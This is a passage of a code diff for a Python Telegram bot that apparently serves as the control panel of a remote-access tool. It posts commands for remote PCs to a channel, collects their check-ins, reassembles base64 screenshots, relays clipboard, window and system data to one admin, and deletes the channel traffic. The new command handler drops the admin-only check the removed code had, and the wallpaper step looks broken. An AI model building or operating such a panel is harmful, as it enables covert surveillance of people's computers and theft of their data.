+        markup = get_web_menu(dev_id)
+    elif cat == "util":
+        text = "🛠 **Утилиты**"
+        markup = get_util_menu(dev_id)
+    elif cat == "extra":
+        text = "🔍 **Дополнительные функции**"
+        markup = get_extra_menu(dev_id)
+    else:
+        return
+
+    if callback.message.photo or callback.message.document:
+        await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)
+    else:
+        await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)
+
+@dp.callback_query(F.data.startswith("cmd_"))
+async def send_command(callback: types.CallbackQuery):
+    parts = callback.data.split("_")
+    if len(parts) < 3:
+        await callback.answer("❌ Ошибка в команде")
+        return
+    
+    cmd_type = parts[1]
+    device_id = parts[2]
+    
+    # Обработка команд с параметрами
+    if cmd_type == "brightness50":
+        full_cmd = "brightness:50"
+    elif cmd_type == "brightness100":
+        full_cmd = "brightness:100"
+    elif cmd_type == "mute":
+        full_cmd = "mute"
+    elif cmd_type == "unmute":
+        full_cmd = "unmute"
+    elif cmd_type == "apps":
+        full_cmd = "apps"
+    elif cmd_type == "activewin":
+        full_cmd = "activewin"
+    elif cmd_type == "clipboard":
+        full_cmd = "clipboard"
+    elif cmd_type == "sysinfo":
+        full_cmd = "sysinfo"
+    elif cmd_type == "netinfo":
+        full_cmd = "netinfo"
+    elif cmd_type == "battery":
+        full_cmd = "battery"
+    elif cmd_type == "restore":
+        full_cmd = "restore"
+    elif cmd_type == "unblock":
+        full_cmd = "unblock"
+    else:
+        full_cmd = cmd_type
+    
+    try:
+        await bot.send_message(chat_id=f"@{CHANNEL_USERNAME}", text=f"CMD:{device_id}:{full_cmd}")
+        await callback.answer("🚀 Команда отправлена!")
+    except Exception as e:
+        await callback.answer(f"❌ Ошибка отправки: {str(e)[:50]}")
+
+# --- ПРИЕМ ДАННЫХ ИЗ КАНАЛА ---
+
+@dp.channel_post(F.text.startswith("INIT_START:"))
+async def handle_client_startup(message: types.Message):
+    try:
+        _, device_id, pc_name = message.text.split(":")
+        update_device_in_db(device_id, pc_name, is_notified=0)
+        await bot.send_message(
+            chat_id=ADMIN_ID, 
+            text=f"⚡️ **Клиент запущен на ПК!**\n💻 Имя: `{pc_name}`\n🟢 Устройство сейчас активно.", 
             parse_mode="Markdown",
             reply_markup=get_device_menu(device_id)
         )
-        await callback.answer()
-    
-    @dp.callback_query(lambda c: c.data.startswith("sys_actions_"))
-    async def system_actions(callback: types.CallbackQuery):
-        if callback.from_user.id != ADMIN_ID:
-            await callback.answer("❌ Доступ запрещен")
-            return
+        await message.delete()
+    except: pass
+
+@dp.channel_post(F.text.startswith("PING:"))
+async def handle_channel_ping(message: types.Message):
+    try:
+        _, device_id, pc_name = message.text.split(":")
         
-        device_id = callback.data.replace("sys_actions_", "")
-        await callback.message.edit_text(
-            "⚙️ *Системные действия*",
-            parse_mode="Markdown",
-            reply_markup=get_system_actions_menu(device_id)
-        )
-        await callback.answer()
-    
-    @dp.callback_query(lambda c: c.data.startswith("cmd_"))
-    async def execute_command(callback: types.CallbackQuery):
-        if callback.from_user.id != ADMIN_ID:
-            await callback.answer("❌ Доступ запрещен")
-            return
+        dev = get_device(device_id)
+        current_time = int(time.time())
         
-        parts = callback.data.split("_")
-        if len(parts) < 3:
-            await callback.answer("❌ Ошибка")
-            return
-        
-        device_id = parts[1]
-        command = parts[2]
-        
-        success = mqtt_server.send_command(device_id, command)
-        
-        if success:
-            await callback.answer(f"✅ Команда '{command}' отправлена")
+        if not dev:
+            update_device_in_db(device_id, pc_name, is_notified=1)
+            await bot.send_message(chat_id=ADMIN_ID, text=f"🆕 **Зарегистрирован новый ПК:** `{pc_name}`", parse_mode="Markdown", reply_markup=get_device_menu(device_id))
         else:
-            await callback.answer(f"❌ Не удалось отправить команду")
-    
-    @dp.callback_query(lambda c: c.data == "stats")
-    async def stats(callback: types.CallbackQuery):
-        if callback.from_user.id != ADMIN_ID:
-            await callback.answer("❌ Доступ запрещен")
-            return
-        
-        devices = get_all_devices()
-        total = len(devices)
-        online = sum(1 for d in devices if d[3])
-        
-        text = "📊 *Статистика*\n\n"
-        text += f"📱 Всего устройств: {total}\n"
-        text += f"🟢 Онлайн: {online}\n"
-        text += f"🔴 Оффлайн: {total - online}\n"
-        text += f"📈 Активность: {int(online/total*100) if total > 0 else 0}%"
-        
-        await callback.message.edit_text(
-            text,
-            parse_mode="Markdown",
-            reply_markup=get_main_menu()
-        )
-        await callback.answer()
-    
-    @dp.callback_query(lambda c: c.data == "clean_offline")
-    async def clean_offline(callback: types.CallbackQuery):
-        if callback.from_user.id != ADMIN_ID:
-            await callback.answer("❌ Доступ запрещен")
-            return
-        
-        devices = get_all_devices()
-        deleted = 0
-        for device_id, _, _, is_online, _ in devices:
-            if not is_online:
-                delete_device(device_id)
-                deleted += 1
-        
-        await callback.answer(f"🗑 Удалено {deleted} оффлайн устройств")
-        await list_devices(callback)
+            last_seen, is_notified = dev[1], dev[2]
+            if current_time - last_seen >= 180 or is_notified == 0:
+                update_device_in_db(device_id, pc_name, is_notified=1)
+                await bot.send_message(chat_id=ADMIN_ID, text=f"🟢 **ПК `{pc_name}` снова на связи!**", parse_mode="Markdown", reply_markup=get_device_menu(device_id))
+            else:
+                update_device_in_db(device_id, pc_name)
+                
+        await message.delete()
+    except: pass
 
-# ============ ЗАПУСК ============
+@dp.channel_post(F.text.startswith("SCR_PART:"))
+async def receive_screenshot_part(message: types.Message):
+    try:
+        _, device_id, part_num, total_parts, base64_chunk = message.text.split(":", 4)
+        part_num = int(part_num)
+        total_parts = int(total_parts)
+        
+        if device_id not in screenshot_buffers:
+            screenshot_buffers[device_id] = {}
+            
+        screenshot_buffers[device_id][part_num] = base64_chunk
+        await message.delete()
+        
+        if len(screenshot_buffers[device_id]) == total_parts:
+            device_info = get_device(device_id)
+            pc_name = device_info[0] if device_info else "ПК"
+            
+            full_base64 = "".join([screenshot_buffers[device_id][i] for i in range(total_parts)])
+            del screenshot_buffers[device_id]
+            
+            image_bytes = base64.b64decode(full_base64)
+            await bot.send_photo(
+                chat_id=ADMIN_ID,
+                photo=BufferedInputFile(image_bytes, filename="screenshot.jpg"),
+                caption=f"📸 Скриншот с ПК: *{pc_name}*",
+                parse_mode="Markdown",
+                reply_markup=get_device_menu(device_id)
+            )
+    except Exception as e:
+        # Логируем ошибку
+        print(f"Error processing screenshot: {e}")
 
-async def main():
-    print("="*60)
-    print("🤖 MQTT Device Manager + Telegram Bot")
-    print("="*60)
-    
-    # Инициализация БД
-    init_db()
-    
-    # Создаем бота
-    bot = Bot(token=BOT_TOKEN)
-    dp = Dispatcher()
-    
-    # Создаем MQTT сервер
-    mqtt_server = MQTTDeviceServer(bot)
-    
-    # Настраиваем обработчики бота
-    setup_bot_handlers(dp, mqtt_server)
-    
-    # Подключаем MQTT
-    if not mqtt_server.connect():
-        print("❌ Не удалось подключиться к HiveMQ Cloud")
-        print("Проверьте настройки MQTT_CONFIG")
+@dp.channel_post(F.text.startswith("LOG_REPLY:"))
+async def receive_channel_log(message: types.Message):
+    try:
+        text_data = message.text.replace("LOG_REPLY:", "")
+        
+        # Пытаемся найти устройство по имени в тексте
+        device_id = None
+        for dev_id, name, _ in get_all_devices():
+            if name in text_data:
+                device_id = dev_id
+                break
+        
+        markup = get_device_menu(device_id) if device_id else None
+        
+        # Если сообщение содержит изображение, отправляем как фото
+        if "скриншот" in text_data.lower() or "screenshot" in text_data.lower():
+            # Ищем в тексте base64
+            if "base64:" in text_data:
+                try:
+                    parts = text_data.split("base64:")
+                    img_data = parts[1].strip()
+                    image_bytes = base64.b64decode(img_data)
+                    await bot.send_photo(
+                        chat_id=ADMIN_ID,
+                        photo=BufferedInputFile(image_bytes, filename="image.jpg"),
+                        caption=text_data[:200],
+                        parse_mode="Markdown",
+                        reply_markup=markup
+                    )
+                    await message.delete()
+                    return
+                except:
+                    pass
+        
+        # Если это системная информация, отправляем с улучшенным форматированием
+        if any(key in text_data for key in ["Информация о системе", "Сетевая информация", "Батарея"]):
+            await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", reply_markup=markup)
+        else:
+            # Обычное сообщение
+            if len(text_data) > 4000:
+                # Разбиваем длинные сообщения
+                for i in range(0, len(text_data), 4000):
+                    chunk = text_data[i:i+4000]
+                    await bot.send_message(chat_id=ADMIN_ID, text=chunk, parse_mode="Markdown", reply_markup=markup if i == 0 else None)
+            else:
+                await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", reply_markup=markup)
+        
+        await message.delete()
+    except Exception as e:
+        print(f"Error processing log: {e}")
+
+# --- ОБРАБОТКА ФАЙЛОВ ДЛЯ УСТАНОВКИ ОБОЕВ ---
+
+@dp.message(F.photo)
+async def handle_photo_for_wallpaper(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
         return
     
-    # Запускаем бота
-    print("🤖 Telegram бот запущен!")
-    print(f"📱 Ваш ID в Telegram: {ADMIN_ID}")
-    print("="*60)
-    
+    # Проверяем, есть ли команда для установки обоев
+    if message.caption and "wallpaper" in message.caption.lower():
+        try:
+            # Получаем самое большое фото
+            photo = message.photo[-1]
+            file = await bot.get_file(photo.file_id)
+            file_data = await bot.download_file(file.file_path)
+            
+            # Отправляем команду клиенту
+            await bot.send_message(
+                chat_id=f"@{CHANNEL_USERNAME}",
+                text=f"WALLPAPER_SET:{file_data.getvalue()}"
+            )
+            await message.reply("🖼 Изображение отправлено для установки обоев")
+        except Exception as e:
+            await message.reply(f"❌ Ошибка: {str(e)}")
+
+# --- УТИЛИТЫ ---
+
+async def send_message_to_device(device_id, text):
+    """Отправляет произвольное сообщение устройству"""
     try:
-        await dp.start_polling(bot)
-    except KeyboardInterrupt:
-        print("\n👋 Остановка...")
-    finally:
-        mqtt_server.disconnect()
-        await bot.session.close()
+        await bot.send_message(chat_id=f"@{CHANNEL_USERNAME}", text=f"CMD:{device_id}:{text}")
+        return True
+    except:
+        return False
+
+# --- ЗАПУСК ---
+
+async def main():
+    init_db()
+    print("[СЕРВЕР] База данных подключена. Ожидание сигналов...")
+    print(f"[СЕРВЕР] Бот запущен, ID админа: {ADMIN_ID}")
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n👋 Программа остановлена")
-    except Exception as e:
-        logger.error(f"Fatal error: {e}")
-        raise
+    asyncio.run(main())
